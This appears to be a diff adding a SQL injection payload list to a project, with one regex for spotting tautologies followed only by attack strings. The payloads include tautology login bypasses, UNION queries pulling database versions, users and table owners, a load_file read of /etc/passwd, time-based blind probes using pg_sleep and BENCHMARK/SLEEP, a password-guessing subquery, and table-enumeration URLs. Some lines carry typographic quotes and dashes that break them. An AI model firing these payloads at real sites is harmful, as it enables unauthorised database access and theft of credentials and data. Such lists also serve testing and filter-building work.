@@ -1,0 +1,36 @@
+
+\b(\d+) ?= ?\1\b|[\'\"](\w+)[\'\"] ?= ?[\'\"]\2\b
+
+
+
+'1'OR'1'
+1' OR '1'='1
+1'or'1
+ 'AND'1=0
+1%20and%20 1=1
+' OR '19+1+2=20-1+4-1
+
+
+‘union select all 1,2,x,x,x,x –
+‘union select 1,2,3,x,x,x,x,@@version,x–
+‘union+select+banner,null,null,null,null+from+v$version–
+‘union+select+user,null,null,null,null+from+dual–
+‘union+select+global_name,null,null,null,null+from+global_name–
+‘union+select+owner,null,null,null,null+from+all_tables–
+‘union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual–
+%27union+select+UTL_INADDR.get_host_name(‘INTERNALs-IP’),null,null,null,null+from+dual–
+2+union+(select+load_file(‘/etc/passwd’),null,null,null,null,null,null,null,null,null,null,null+from+dual)
+2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual)
+
+
+‘ and 1 = any (select 1 from users where FULL_NAME like ‘%%dministrator’ and rownum<=1 and PASSWORD like ‘0%’) and ‘1%%’=’1
+1%20and%20substring(version(),1,1)=5
+(substring(version(),1,1)=5)
+1';select pg_sleep(2); –
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3))/*’XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR’|”XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDEADBEEF)),SLEEP(3)))OR”*/
+
+
+
+http://test.com/default.asp?id=100 and 0<=(SELECT count(*) FROM [site]) and 1=1 —> WHITE PAGE -=> TABLE FOUND!
+http://test.com/default.asp?id=100 and 0<=(SELECT count(*) FROM [notatable]) and 1=1 —> ERROR -=> TABLE NOT FOUND!
+
